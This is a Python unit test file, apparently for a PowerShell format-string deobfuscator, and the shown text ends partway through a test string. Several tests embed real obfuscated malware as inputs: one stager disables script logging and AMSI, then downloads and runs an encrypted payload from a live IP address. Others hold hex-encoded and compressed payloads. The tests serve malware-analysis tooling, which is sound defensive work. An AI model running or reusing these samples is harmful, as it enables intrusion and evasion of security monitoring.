#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from ... import TestUnitBase


class TestFormatString(TestUnitBase):

    def setUp(self):
        super().setUp()
        self.unit = self.load()

    def test_trivial(self):
        self.assertEqual(
            self.unit(BR""""{0}{2}{1}"-f 'signa','ures','t'"""),
            b'"signatures"'
        )

    def test_all_single_quotes(self):
        self.assertEqual(
            self.unit(BR"""'{0}{2}{1}'-f 'signa','ures','t'"""),
            b'"signatures"'
        )

    def test_mixed_quotes(self):
        self.assertEqual(
            self.unit(BR'''"{0}{2}{1}"-f 'signa','ures',"t"'''),
            b'"signatures"'
        )

    def test_format_string_with_chars(self):
        self.assertEqual(
            self.unit(b'("{0}na{2}{1}"-f \'sig\',\'ures\',\'t\')'),
            b'("signatures")'
        )

    def test_real_world_01(self):
        self.assertIn(b'http://131.255.5.65:80', self.unit(
            BR'''"C:\Windows\System32\cmd.exe" /C"seT   JGs=.('Sv')  ('ZHe'+'x')  ( [TYPE]("{3}{14}{2}{6}{7}{10}{11}{1}{9}{5}{4}{0}{12}{13}{8}"-F'nG,sys','RY[','nS.','CoLL','I','TR','Ge','nErIc.d','bjECt','s','iCT','ioNa','TEM.','o','eCtIo') )  ;  .("{1}{2}{0}" -f 'TEm','Set','-i') ("{2}{0}{1}" -f 'iABle:jHGs','0','Var') ([TYPE]("{3}{0}{2}{1}"-f'CrI','K','PTBLOc','s')  ) ;  ^&("{1}{0}{2}"-f 'Et','S','-iTem') ("{0}{3}{2}{1}"-f 'VariA','0','E:e8','bL') ([TyPe]("{1}{0}"-F'F','RE'));    ${1`6j9}=  [typE]("{2}{6}{8}{4}{7}{0}{5}{3}{1}"-f'Nt','GEr','system.N','aNa','ERViC','M','et.','epoI','S')  ; ${3`sR2} = [TYpE]("{2}{0}{3}{1}"-F 'STeM.NeT.W','equESt','SY','ebR')  ;    .('sv') ("{0}{1}" -f'dt37m','b') (  [tyPe]("{4}{6}{0}{1}{5}{3}{2}"-f'M.neT.Cr','eD','e','CAch','Sy','EnTIaL','ste')  )  ;   .("{0}{1}" -f'se','t') ('Ut2'+'i') ( [TYPE]("{4}{3}{2}{0}{1}"-f'm.TEXT.ENcODi','nG','e','T','SYS')  ); IF(${ps`VE`RsIoNtab`LE}."PsV`E`Rsi`On"."MaJ`OR" -GE 3){${G`Pf}= (  ^&("{3}{0}{1}{2}" -f'Et-VA','Ria','bLE','g') ("{1}{0}"-f'0','E8') -VALUEonLy )."ass`eM`BlY".("{2}{0}{1}" -f'TTY','Pe','GE').Invoke(("{1}{3}{6}{2}{4}{0}{5}" -f'on.Ut','Syst','to','em.Managem','mati','ils','ent.Au'))."GETFiE`ld"(("{2}{3}{4}{0}{1}{5}"-f 'cyS','ettin','c','ac','hedGroupPoli','gs'),'N'+("{4}{2}{1}{0}{3}" -f'ublic,S','P','n','tatic','o'));If(${G`Pf}){${G`Pc}=${g`pf}.("{0}{1}" -f 'G','ETVAlue').Invoke(${n`Ull});If(${g`pc}[("{0}{2}{1}" -f'Scri','tB','p')+("{2}{1}{0}"-f 'ing','ckLogg','lo')]){${G`PC}[("{1}{0}" -f 'ptB','Scri')+("{2}{0}{1}"-f 'kLoggi','ng','loc')][("{3}{1}{0}{2}" -f'p','leScri','tB','Enab')+("{1}{0}{2}" -f 'gin','lockLog','g')]=0;${G`Pc}[("{1}{0}"-f'ptB','Scri')+("{1}{0}{2}"-f'ckLog','lo','ging')][("{0}{5}{7}{4}{2}{1}{6}{3}" -f 'En','nvoc','lockI','gging','ptB','able','ationLo','Scri')]=0}${v`Al}=  ${Zh`ex}::("{1}{0}" -f 'eW','n').Invoke();${v`Al}.("{0}{1}" -f'Ad','D').Invoke(("{3}{1}{2}{0}" -f'riptB','bl','eSc','Ena')+("{3}{1}{2}{0}"-f'ng','c','kLoggi','lo'),0);${V`Al}.("{1}{0}"-f'd','Ad').Invoke(("{4}{5}{6}{1}{3}{2}{7}{0}"-f 'ing','ockInv','catio','o','EnableS','cr','iptBl','nLogg'),0);${G`pc}[((("{19}{1}{21}{22}{4}{3}{16}{24}{8}{17}{11}{10}{7}{18}{20}{6}{5}{12}{23}{9}{14}{15}{13}{2}{0}" -f 'B','Y','pt','EZ1m','_MACHIN','sZ1','1mWindow','i','areZ1mPolic','l','1mM','esZ','m','cri','lZ','1mS','S','i','crosof','HKE','tZ','_','LOCAL','PowerShe','oftw'))  -CrePLAcE  ([chAr]90+[chAr]49+[chAr]109),[chAr]92)+("{0}{3}{1}{2}"-f 'lo','ggin','g','ckLo')]=${V`AL}}ELse{  (  ^&("{0}{2}{3}{1}"-f 'gEt-','IAbLE','v','AR')  ("{1}{0}" -f'gS0','jH')  -va  )."GEtFiE`Ld"(("{0}{2}{1}"-f 'signa','ures','t'),'N'+("{0}{1}{2}{3}" -f'on','Public,S','ta','tic')).("{1}{0}{2}" -f 'TVa','SE','lue').Invoke(${nu`lL},(^&("{1}{0}{3}{2}" -f'Ew-','N','Ect','OBJ') ("{9}{6}{7}{1}{0}{4}{8}{3}{5}{2}" -f'eR','N','InG]','hSE','iC.HA','t[str','olLe','cTiONS.GE','S','C')))}  ( ^&("{0}{1}" -f 'VAR','IAbLe')  ("{1}{0}" -f'80','e'))."VAl`Ue"."aSSe`m`BLY".("{1}{2}{0}" -f'Pe','GETT','y').Invoke(("{7}{6}{2}{3}{9}{5}{1}{4}{0}{8}{10}" -f'on.Amsi','omat','ge','m','i','t','a','System.Man','Uti','ent.Au','ls'))^|.('?'){${_}}^|^&('%'){${_}.("{1}{0}{2}"-f 'FIEL','GEt','D').Invoke(("{3}{0}{1}{2}{4}"-f 'In','itFai','l','amsi','ed'),("{0}{2}{1}"-f'No','ic','nPublic,Stat')).("{0}{2}{1}" -f'S','VALUe','eT').Invoke(${N`Ull},${T`RuE})};};  ( ^&("{1}{0}"-f 'm','Ite')  ("v"+"Ar"+"IabLe:"+"16J9") )."v`ALue"::"E`xpe`Ct100`c`onti`Nue"=0;${Wc}=^&("{1}{2}{0}"-f 'T','NeW-','Objec') ("{5}{4}{0}{2}{6}{1}{3}"-f'WebC','n','L','T','NEt.','SYstEm.','ie');${u}=("{13}{0}{3}{1}{5}{10}{16}{2}{8}{12}{4}{6}{7}{11}{9}{15}{14}" -f'ozilla/',' (Wi','s ','5.0',';','n',' rv:1','1.0) ','NT 6.1; WOW64;','ke G','d','li',' Trident/7.0','M','ko','ec','ow');${Wc}."HEA`deRs".("{1}{0}"-f 'DD','A').Invoke(("{1}{0}{2}" -f'r-Age','Use','nt'),${u});${wC}."pR`oXY"= ( ^&("{2}{0}{1}"-f 'iAb','le','GET-vaR')  ("3"+"Sr2") )."va`lUe"::"Defa`U`Ltweb`PrOxy";${WC}."p`ROXy"."CR`E`dEnTI`AlS" =  (  ^&("{2}{1}{0}" -f 'teM','di','Chil') ("{1}{3}{2}{0}"-f'mb','varIaBLE:','T37','d')  )."V`Alue"::"dEfA`UL`TNeT`Wo`RKcredentiAls";${SC`R`ipT`:`PRoxy} = ${wc}."P`RoXy";${K}= (^&("{0}{1}" -f 'va','riabLe') ('Ut2'+'i') )."v`ALuE"::"a`SCIi".("{1}{2}{0}" -f'ES','G','ETBYT').Invoke(("{5}{1}{4}{0}{3}{2}" -f'c7aa','9acd','9ac5cd9c','0','1811','aede680d435'));${r}={${D},${k}=${aR`GS};${S}=0..255;0..255^|^&('%'){${j}=(${J}+${s}[${_}]+${K}[${_}%${k}."cou`NT"])%256;${S}[${_}],${S}[${J}]=${S}[${J}],${S}[${_}]};${d}^|.('%'){${I}=(${i}+1)%256;${H}=(${h}+${S}[${i}])%256;${s}[${I}],${S}[${h}]=${S}[${h}],${s}[${I}];${_}-bXOR${s}[(${s}[${i}]+${s}[${h}])%256]}};${S`eR}=("{4}{3}{2}{1}{5}{0}"-f '5:80','31.255','//1',':','http','.5.6');${t}=("{3}{0}{2}{1}" -f 'min/ge','p','t.ph','/ad');${Wc}."He`ADErs".("{1}{0}"-f'D','AD').Invoke(("{0}{2}{1}"-f'C','okie','o'),("{4}{2}{1}{0}{5}{3}{6}"-f 'P','=9lSc2HiKKJ0','sion','cFj6vBQukc','ses','j','ypvg='));${D`Ata}=${wC}.("{2}{0}{1}"-f 'aD','DATa','DOWnLo').Invoke(${S`ER}+${t});${i`V}=${da`Ta}[0..3];${D`Ata}=${D`AtA}[4..${D`Ata}."leN`GTH"];-JoIN[CHaR[]](^& ${r} ${d`ATa} (${iv}+${K}))^|.("{1}{0}" -f 'X','IE')&&SeT  ZRL=ecHO  INvoKe-EXPrEssiOn (GEt-ItEM EnV:JgS).VaLue ^| pOWershELL  -noeXI -nOPRoFi -nonInterac  -wINdOw  HidDeN -eXEC bypass   -  &&Cmd /C %zrl%"'''
        ))

    def test_real_world_02(self):
        self.assertIn(b'TOINt16', self.unit(
            BR'''pOweRShell -WI HiDDEn -CoMM "(-joIN(('2628277365742d7661724941624c452729206748633752365874523861452031363b2e28275345542d76272b27615249272b2761272b27624c45272920506b66594b46565342546d6e2032373b2e282e2828273220302031272d7245706c614365275c772b272c277b247b307d7d272d7245506c4143652720272c2727292d662763272c276d272c276727292828273420322033203020352036203720382036203920312032272d7265504c414365275c772b272c277b247b307d7d272d7265704c4163452720272c2727292d66272d272c276c272c2765272c2774272c2773272c2776272c2761272c2772272c2769272c276227292920455543734d706c49795230332034333b2628262828273020312032272d7245506c614365275c772b272c277b247b307d7d272d5265704c6163452720272c2727292d662767272c2763272c276d272928277b307d272d66277365542d5641526961424c652729292046387269763872524371724b282828282628277b317d7b307d272d662765272c276765742d7641526961426c272920674863375236587452386145292e282776614c55272b274527292b3239292d41535b636861525d292e2827744f735472696e272b274727292e694e566f6b6528292b2828282e28277b347d7b327d7b307d7b317d7b357d7b337d272d66272d56272c276152494162272c2754272c2745272c274765272c276c272920506b66594b46565342546d6e292e282827342032203020312033272d5265506c614345275c772b272c277b247b307d7d272d5265506c6163652720272c2727292d66276c272c2775272c2761272c2765272c277627292b3734292d61735b434841525d292e2827746f735472496e4727292e494e564f6b6528292b2828282628277b337d7b307d7b317d7b327d272d662762272c274c272c2765272c276745742d5661724961272920455543734d706c4979523033292e28277b307d7b327d7b317d272d662756614c272c2745272c275527292b3536292d61735b634841725d292e282827342032203520342033203120302036272d7265706c614345275c772b272c277b247b307d7d272d7265504c4163652720272c2727292d66276e272c2769272c276f272c2772272c2774272c2773272c276727292e494e764f6b652829293b506f7745527348454c4c202d4e4f4e694e7445726163202d6e4f4c4f676f202d4e4f50202d57696e646f77732048494444456e202d457845432042597061735320282e2828273720342039203020322033203120362033203520382034272d5245704c616345275c772b272c277b247b307d7d272d5245706c4163452720272c2727292d66272d272c2772272c2776272c2761272c2765272c2762272c2769272c2767272c276c272c277427292046387269763872524371724b292e282827342033203120302032272d5265706c416345275c772b272c277b247b307d7d272d7265506c4143652720272c2727292d662775272c276c272c2765272c2761272c277627292e282827352032203620352034203020312033272d7245704c416365275c772b272c277b247b307d7d272d5265504c4163652720272c2727292d662769272c276e272c276f272c2767272c2772272c2774272c277327292e694e766f6b4528294a67416f414359414b41416f414363414d4141674144494149414178414363414c514253414555415541424d414745415977426c4143634158414233414373414a774173414363416577416b414873414d414239414830414a774174414649415a514251414577415951426a414755414a774167414363414c41416e414363414b514174414759414a77426e414363414c41416e414730414a774173414363415977416e41436b414b41416f414363414f5141674144594149414130414341414d4141674144634149414179414341414d5141674144674149414179414341414e51416741444d4149414132414363414c514279414555416341427341454541517742464143634158414233414373414a774173414363416577416b414873414d414239414830414a77417441464941525142774145774151514244414755414a774167414363414c41416e414363414b514174414759414a774174414363414c41416e414849414a774173414363415951416e414377414a774273414363414c41416e414851414a774173414363415967416e414377414a77426c414363414c41416e414859414a774173414363416151416e414377414a77427a414363414b514170414341416167426f4148634155514178414767414e774275414451414d51426e414555414941413041444d414f774175414367414a67416f414363415a774244414530414a774170414367414b41416e4144414149414134414341414e41416741446b414941417a414341414e7741674144594149414178414341414e7741674144554149414179414341414f41416e4143304163674246414841415441426841474d415251416e4146774164774172414363414c41416e414873414a4142374144414166514239414363414c51427941475541554142734147454159774246414363414941416e414377414a77416e41436b414c51426d414363416377416e414377414a774270414363414c41416e414777414a774173414363416467416e414377414a774230414363414c41416e414749414a774173414363416367416e414377414a774268414363414c41416e414755414a774173414363414c51416e41436b414b51416741464d4165514248414445415251424e4148634162674233414730415551424d414341414e774130414473414a67416f414334414b41416f414363414d6741674144454149414177414363414c514279414755416341427341454541597742464143634158414233414373414a774173414363416577416b414873414d414239414830414a774174414849415a514251414577415151426a414755414a774167414363414c41416e414363414b514174414759414a774274414363414c41416e41474d414a774173414363415a77416e41436b414b41416e41484d415a51425541433041646742424148494161514268414749416241416e414373414a77426c414363414b514170414341415241413341476f4162414277414538416551427641476f414d77424a41454d4149414133414459414f77416d414367414b41416e4144454149414131414341414d67416741446b4149414130414341414e7741674144594149414177414341414e77416741444d4149414134414341414e51416e414330415567426c414641415441424241454d415a51416e4146774164774172414363414c41416e414873414a4142374144414166514239414363414c514253414555415541424d4147454159774246414363414941416e414377414a77416e41436b414c51426d414363416151416e414377414a77427a414363414c41416e414851414a774173414363415967416e414377414a774232414363414c41416e414755414a774173414363416367416e414377414a774268414363414c41416e414777414a774173414363414c51416e41436b4149414236414855415451424f41453441566742314147674157414258414659414d67416f414367414b41416f414359414b41416e41456341525142554143304164674268414849416151416e414373414a774242414549414a774172414363416241416e414373414a774246414363414b51416741476f4161414233414645414d51426f4144634162674130414445415a77424641436b414c67416f414367414a774178414341414e414167414449414941417a414341414d41416e414330416367426c414841415441426841474d415a51416e4146774164774172414363414c41416e414873414a4142374144414166514239414363414c5142534147554163414273414745415977426c414363414941416e414377414a77416e41436b414c51426d414363415a51416e414377414a774232414363414c41416e414777414a774173414363416451416e414377414a774268414363414b514172414449414b514174414545415577426241454d41534142424146494158514170414334414b41416e414651414a774172414363416277427a4148514163674270414363414b77416e414734414a774172414363415a77416e41436b414c6742704145344164674276414773415251416f41436b414b77416f414367414b414175414367414a77423741444d416651423741444941665142374144454166514237414441416651416e414330415a67416e414755414a774173414363416241416e414377414a77427941476b4151514269414363414c41416e41476341525142554143304156674242414363414b51416741464d4165514248414445415251424e4148634162674233414730415551424d41436b414c67416f414367414a774130414341414d414167414445414941417a414341414d67416e4143304155674246414841415441426841454d415a51416e4146774164774172414363414c41416e414873414a4142374144414166514239414363414c514279414755416341424d414545415177426c414363414941416e414377414a77416e41436b414c51426d414363415951416e414377414a774273414363414c41416e414755414a774173414363416451416e414377414a774232414363414b514172414449414e77417041433041595142544146734151774249414745416367426441436b414c67416f414367414a77417a414341414d674167414441414941417a414341414d5141674144594149414130414341414e51416e414330415567426c414641415441424241474d415a51416e4146774164774172414363414c41416e414873414a4142374144414166514239414363414c514253414555415541424d414745415177426c414363414941416e414377414a77416e41436b414c51426d414363416377416e414377414a774279414363414c41416e414738414a774173414363416441416e414377414a774275414363414c41416e414763414a774173414363416151416e41436b414c67424a4147344164674250414773415251416f41436b414b77416f414367414b414175414367414a77423741444541665142374144494166514237414441416651416e414330415a67416e414555414a774173414363415277426c414651414c514257414745416367424a414363414c41416e4147454151674273414363414b514167414551414e774271414777416341425041486b416277427141444d415351424441436b414c67416f4143634156674242414363414b77416e414777414a774172414363416451416e414373414a774246414363414b514172414449414d77417041433041515142544146734159774249414745416367426441436b414c67416f41436341657741784148304165774177414830414a774174414759414a77424f414763414a774173414363416441427641484d416441425341456b414a7741704143344153514275414859415477424c414755414b41417041436b414f77427741473841567742464148494163774249414555416241424d414341414c51424f414538416267424a414341414c51424f4145384154414276414763415477416741433041546742504146414155674276414559414941417441466341535141674145674153514245414751415a514275414341414c51426c414867415251426a414855414941424341466b415541424241484d4163774167414367414a67416f414359414b41416f414363414d4141674144454149414179414363414c5142534145554163414273414745415177426c4143634158414233414373414a774173414363416577416b414873414d414239414830414a774174414849415a514277414777415951426a414555414a774167414363414c41416e414363414b514174414759414a77426e414363414c41416e41474d414a774173414363416251416e41436b414b41416e414873414d514239414873414d774239414873414d674239414873414e414239414873414d414239414363414c51426d414363415251416e414377414a7742484147554156414174414859414a7741734143634153514268414749414a7741734143634159514279414363414c41416e414577414a77417041436b4149414236414855415451424f41453441566742314147674157414258414659414d674170414334414b41416e414873414d414239414363414c51426d41436341646742424147774156514246414363414b514175414367414b41416e4144454149414179414341414e4141674144454149414177414341414d7741674144594149414131414363414c514279414555415541427341474541517742464143634158414233414373414a774173414363416577416b414873414d414239414830414a774174414849415a514277414577415151426a414555414a774167414363414c41416e414363414b514174414759414a774279414363414c41416e414851414a774173414363416277416e414377414a774270414363414c41416e41484d414a774173414363415a77416e414377414a774275414363414b51417541456b41626742324145384161774246414367414b51416f41467341517742494147454155674262414630415851416f414367415777426a41476741515142534146734158514264414367414a67416f414367414a774130414341414e7741674144414149414131414341414d674167414467414941417a414341414e7741674144594149414178414363414c514253414555415541424d414745415977426c4143634158414233414373414a774173414363416577416b414873414d414239414830414a774174414649415a5142774145774151514244414755414a774167414363414c41416e414363414b514174414759414a774233414363414c41416e414851414a774173414363416277416e414377414a774271414363414c41416e414734414a774173414363414c51416e414377414a77426a414363414c41416e414755414a774173414363415967416e41436b414941416f41436341657741774148304165774178414830414a774174414759414a77424f4147554156414175414863415251426941454d4154414270414555416267416e414377414a774230414363414b514170414334414b41416e41475141627742584145344154414276414363414b77416e414545415241427a4148514155674270414534415277416e41436b414c67424a4145344164674276414573415251416f414351415a514275414859414f6742304147554162514277414373414a77426341474d415651426b414767414f41425a414667415267424a4148554152414135414363414b514170414877414a5142374143514165514247414549416551425441476f4157674242414663416451425441486f4150514177414830416577416b414638414c5142434148674162774253414363416367417941464d41596742774147774155674230414763415a6742744144414152514248414755415677425641456b4152514274414759415251424a41486f416377413541486341624141314144514164414259414863415967424e414751415441427341486b414d51427141466f414a7742624143514165514247414549416551425441476f4157674242414663416451425441486f414b774172414355414e4141794146304166514170414330416167425041476b415467416e414363414b514137414649415a514274414738416467426c41433041535142304147554162514167414351415a514275414859414f6742304147554162514277414363415841426a414655415a41426f41446741575142594145594153514231414551414f51416e41413d3d'-sPLIt'(?<=\G.{2})(?!$)')|%{[CoNverT]::('{2}{0}{1}'-f'INt1','6','TO').InvOke(($_),16)-AS[chaR]}))|&(('8 10 5 9 0 1 7 1 6 4 2 1 3 3 8 9 10'-RePLaCe'\w+','{${0}}'-rEplAcE' ','')-f'k','e','r','s','p','v','x','-','i','o','n')"'''
        ))

    def test_real_world_03(self):
        payload = B'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'
        self.assertIn(payload, self.unit(
            BR''' "\"(.("{1}{2}{0}" -f 'T','nE','W-objec') ("{6}{5}{0}{3}{2}{8}{1}{7}{4}" -f 'I', 'e', 'cOMPRESSION.', 'o.', 'TEsTREam', 'Ystem.', 'S', 'Fla', 'd')( [syStEm.Io.mEmorYstREam] [cONVeRt]::"Fr`om`BasE6`4sT`RiNg"(("{9}{41}{37}{28}{2}{92}{89}{75}{40}{33}{58}{94}{1}{17}{52}{49}{93}{59}{54}{64}{63}{45}{36}{70}{66}{15}{13}{22}{12}{65}{39}{61}{10}{7}{81}{87}{29}{95}{96}{79}{23}{44}{18}{71}{42}{20}{24}{82}{25}{69}{38}{30}{5}{0}{88}{97}{77}{78}{67}{55}{27}{62}{84}{48}{76}{90}{80}{21}{74}{31}{16}{56}{43}{47}{35}{11}{73}{72}{83}{19}{98}{57}{50}{53}{85}{32}{51}{46}{91}{6}{34}{26}{60}{4}{86}{8}{14}{3}{68}"-f
                'A5WT4Ysfzc','9qMq2pivVle3JZbbOIhBeFCyVDVxqqJvQkMViBROixQTBBEMga','4xVg3fZ78OUR9V8','X377s08+/PP7zeP348y/Tl0+P18','Z5TiLVA39KotEnX8m9JX/F2JO4awWO6','NIzLZMqznSDYjZsoP2Nr','+','BoYnCuEIfgVcnQyhezoy8RWTbgJDd3bnrDaUEYNHOsaiaNHYi0qJY3kdL7t','rXS0t3GdynTydk1V2TJd2anb','PZhbq+XGFYT/yn4wOefgxPS9g99ELshBxCYTUGAY9OAIWTDYMBz0kui/p77qPXnYsC+t7nWpqlW9H797vD6++TD/5fNy/vlj/PSt3u+flx/+/THmT9++/OvlTb+/Pl5KuGrYSzhjbGssdY6pr7U','nYbNCqyWgyTkLKcbshQVKGkSlFJKKP4lctGY7pV09RGmcBk9xOEfPrw9DUerU7aWnugknEHM','FwsjnxX','pEzOlhHQRv8IIEqQXycLCL+KGMtDzM0CvFxaLRVOmoasW','qPdOF2wglcTS4pcEh9GeqSh+zBvtS3UVfVDoWriXMOM72HFbIZl3RK6FK0JwDOU','KA9f48t2Hnz7/8M/Xl2s7pn2+l/V8eXv89/H','Q1p57l3CANSBlwdATNVj6VA92WbWnPwpgwm','Kp0ZqXIeMBDbnGhUo+GeY/wRrNRMi9GOj2','zPMO','z2ZNUgZi56','4wa8yHapYhvCWOAUvRgh3mat6TFlriK2i77VeEM3cBlVetPTe1E/cf5meCXnVUAP+PoUP1zbNxGWPygkzYxVCIak93mhJjLv9IH1fjZgd','mRgS3boLFcAgA','6tC4ecVgmY6A0LTMhqsFxLe+cxNJzkZLj','ElBW+PKk6','QacEfD2Va77NzwJrdQSTt850MI','N','fNc9WB05PN0egBR0oNgGVQ9y375QY9MY3RxH','GHPa6o005sv3HbIduw19RcFUFymUs7q4yWX/e7P7Kt7HPwDVfzkcvqwFcNuZ0x70X/8+0KGn/4Y4LIeJGnI3sS1e5aiUX+UeySx','ELK5eegfOLUxPoMZ4CF7DivQFwlszaf5CdlSu','JZa','E','hM','9fcKfZyWMAiDGqgzliJBU4Utz7NCg3OJF1Ufw4ELdmRG+TUg9xDBJGxNGOPNQt4e6PKMYB4','ucTgbleyy+qZM1D4Gbq4GPJ','TqA9/F2sEUHtLzrgM1bjMDvWOtZw6EAY86ce48s9ZZNKguIdNFDZ8xx9iat6Oykw+r+3GSKua7a4lRM2','Wk++j8YGw9RqG4C','r','9o2md0KIRzApojwNan5k1FSRIXO5iATwOatE1c+uu','sfY7ljTHmK4Yqt7nO6ZylrCVcMcYrxj7XdsdW15iK1NMadHC','zU','hO8fCypp97','o+j4pkqjTa59jbWdtuw4+tJkCa','u','6DVEJdwQvWu/lA7z7U2WSg1HgxSYFeEZU+GxOlAkwR3ArXMBCRR3BT39GIK3IOj2JQMfHn+IhLkoa','ZmBDqwogWBwqX7Trm69Y7X2Vi7kQHqG+R9whi+7ERtcfniXRDofNm5EXllhCKJ1XHcxnASGpAEWwqVnzycCyK7W','epq','dV1InkQm/GC8RoKiJBakmip','EpSW88JdEPGSRCkhF','6OLWcEYnXRlY+fICfl63iOEE','UOJA/','BNUs6E','gvkeKjAjT7V0BnEjFnYNRPWaSHZ3sFPSmHzd','R7KHOIMgHK98jAjgu2F21Nh','mo3vMKa1PpquKlVKFtPa7umKrYBJES56ZC','dxgcTT0W+6u7PyNpXH8rIECfxGK','UbgE3sKnms+KBE2UHGVqiiaRC0BUMxS5Uu5hqWArnE0tKWC5rW4+','6YN6k5vKEdYMcDJJ4qQTep','Wuga0w7/ocmcb+YfXe','bWQXMTQCk3','iruz3UjmFpdOBL','GrjGI4LS4/jia6XMNhUs8ie9WqkoUK3dhFSIxM93zLZbKry2oTTHK8W96YSk1Ysc1OLazzdljC6l3mU6iUV','5wi14au7OM9ThDEJ','vLuwSMaRnxoTYh7xqCv6Tp0VGoTip4xSRJ1bEQqEKgNPa','JuO','YVxEaeiGCjg5xLbKEAl1+N39yt3UkVBQWtg3AZVNjWD0','dctxil0Fou3EW7NO09aFlAUp90dZFTCtOia6CZYhjlABJBVVyNR2b5FGwQzzi6SoelO5UyMlUl','wWC2jl41gk3ZN